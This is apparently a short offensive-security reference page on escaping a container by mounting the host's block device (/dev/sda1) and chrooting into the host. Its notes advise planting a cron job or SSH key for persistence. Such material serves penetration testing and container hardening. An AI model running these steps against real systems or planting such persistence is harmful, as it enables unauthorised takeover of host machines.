---
title: "Host block device: mounting the host disk from a container"
description: "Escaping a container that can see a host block device, such as /dev/sda, by mounting it and reading or writing the host filesystem directly, then chrooting in or planting a persistence mechanism on the host."
keywords:
  - host block device
  - /dev/sda
  - mount host disk
  - container escape
  - privileged container
---

# Host block device

If the container can see the host's root block device (every device in a privileged container, or a specific `--device`), mounting it gives the whole host filesystem.

```bash
cat /proc/partitions                 # find the host root disk, e.g. sda / sda1
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host sh                  # or write authorized_keys / cron directly
```

## Exploitation notes

- Mounting needs the `mount` syscall, so pair device visibility with [CAP_SYS_ADMIN](../capability-abuse/cap-sys-admin.md) or a privileged container.
- Identify the right partition from `/proc/partitions` and `lsblk`; LVM or encrypted roots need the matching mapper device.
- Writing is the durable option: drop a cron job or SSH key rather than relying on an interactive chroot.

## References

- [man 8 mount](https://man7.org/linux/man-pages/man8/mount.8.html)
- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
